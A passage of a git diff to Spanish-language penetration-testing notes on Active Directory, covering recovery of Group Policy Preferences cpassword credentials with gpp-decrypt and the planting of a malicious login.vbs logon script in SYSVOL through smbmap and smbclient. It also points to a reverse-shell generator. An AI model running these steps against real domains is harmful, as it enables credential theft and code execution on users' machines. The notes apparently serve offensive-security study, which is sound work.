@@ -39,7 +39,7 @@ MACHINE/
     └── Startup/
 ```
 
-## GPP (Group Policy Preferences) / cpassword 
+## 1. GPP (Group Policy Preferences) / cpassword 
 
 Permite a los administradores configurar preferencias de usuarios/equipos mediante GPO. En versiones antiguas, algunas preferencias podían almacenar credenciales en `SYSVOL` dentro de archivos como `Groups.xml` usando `cpassword`.
 
@@ -54,7 +54,7 @@ Lectura:
 ❯ gpp-decrypt 'password'    # Descifrar la password por medio de la clave AES para obtenerla en texto claro
 ```
 
-## Logonscript
+## 2. Logonscript
 
 Un **Logon Script** es un script que Windows ejecuta cuando un usuario inicia sesión. Puede estar configurado mediante una GPO y normalmente encontrarse en `SYSVOL`.
 
@@ -75,15 +75,19 @@ Escritura:
 
 ```bash 
 # Tener permisos de lectura y escritura en Sysvol 
-❯ smbmap -H IP_DC -u user -p 'paasswd' 
+❯ smbmap -H IP_DC -u user -p 'passwd' 
 
 # Ingresar al directorio
 ❯ smbclient //IP_DC/SYSVOL -u 'user%passwd'
 	❯ put login.vbs     # Subir el archivo en la ruta encontrada '/scripts'
+
+
+NOTA:
+	- A veces solo hay que subir un archivo con 'put' para saber si se tiene permisos de escritura en SYSVOL
 ```
 
 * [Revershell](https://www.revshells.com/)
-
+### Revershell para .VBS
 ```bash 
 # Generar la revershell colocando el código dentro del archivo 'login.vbs'
 
